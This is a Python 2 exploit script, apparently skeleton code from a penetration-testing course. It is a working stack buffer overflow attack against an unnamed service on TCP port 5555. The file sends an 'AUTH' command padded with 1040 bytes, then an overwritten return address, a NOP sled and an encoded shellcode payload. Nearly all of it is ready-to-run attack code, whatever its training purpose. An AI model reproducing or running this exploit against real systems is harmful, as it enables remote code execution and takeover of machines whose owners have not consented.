#!/usr/bin/python
import time, struct, sys
import socket as so


# Skeleton code from PWK.
# Usage: python vuln.py <IP>

shellcode = (
"\xbb\x0d\xdc\x40\x38\xdd\xc5\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x5d\x12\x83\xc5\x04\x03\x50\xd2\xa2\xcd\x96\x02\xa0"
"\x2e\x66\xd3\xc5\xa7\x83\xe2\xc5\xdc\xc0\x55\xf6\x97\x84\x59"
"\x7d\xf5\x3c\xe9\xf3\xd2\x33\x5a\xb9\x04\x7a\x5b\x92\x75\x1d"
"\xdf\xe9\xa9\xfd\xde\x21\xbc\xfc\x27\x5f\x4d\xac\xf0\x2b\xe0"
"\x40\x74\x61\x39\xeb\xc6\x67\x39\x08\x9e\x86\x68\x9f\x94\xd0"
"\xaa\x1e\x78\x69\xe3\x38\x9d\x54\xbd\xb3\x55\x22\x3c\x15\xa4"
"\xcb\x93\x58\x08\x3e\xed\x9d\xaf\xa1\x98\xd7\xd3\x5c\x9b\x2c"
"\xa9\xba\x2e\xb6\x09\x48\x88\x12\xab\x9d\x4f\xd1\xa7\x6a\x1b"
"\xbd\xab\x6d\xc8\xb6\xd0\xe6\xef\x18\x51\xbc\xcb\xbc\x39\x66"
"\x75\xe5\xe7\xc9\x8a\xf5\x47\xb5\x2e\x7e\x65\xa2\x42\xdd\xe2"
"\x07\x6f\xdd\xf2\x0f\xf8\xae\xc0\x90\x52\x38\x69\x58\x7d\xbf"
"\x8e\x73\x39\x2f\x71\x7c\x3a\x66\xb6\x28\x6a\x10\x1f\x51\xe1"
"\xe0\xa0\x84\xa6\xb0\x0e\x77\x07\x60\xef\x27\xef\x6a\xe0\x18"
"\x0f\x95\x2a\x31\xba\x6c\xbd\x34\x30\x6e\xff\x21\x44\x6e\xfe"
"\x0a\xc1\x88\x6a\x7d\x84\x03\x03\xe4\x8d\xdf\xb2\xe9\x1b\x9a"
"\xf5\x62\xa8\x5b\xbb\x82\xc5\x4f\x2c\x63\x90\x2d\xfb\x7c\x0e"
"\x59\x67\xee\xd5\x99\xee\x13\x42\xce\xa7\xe2\x9b\x9a\x55\x5c"
"\x32\xb8\xa7\x38\x7d\x78\x7c\xf9\x80\x81\xf1\x45\xa7\x91\xcf"
"\x46\xe3\xc5\x9f\x10\xbd\xb3\x59\xcb\x0f\x6d\x30\xa0\xd9\xf9"
"\xc5\x8a\xd9\x7f\xca\xc6\xaf\x9f\x7b\xbf\xe9\xa0\xb4\x57\xfe"
"\xd9\xa8\xc7\x01\x30\x69\xe7\xe3\x90\x84\x80\xbd\x71\x25\xcd"
"\x3d\xac\x6a\xe8\xbd\x44\x13\x0f\xdd\x2d\x16\x4b\x59\xde\x6a"
"\xc4\x0c\xe0\xd9\xe5\x04")

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

req1 = "AUTH " + "A" * 1040 + "\x71\x1D\xD1\x65" + "\x90" * 16 + shellcode

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
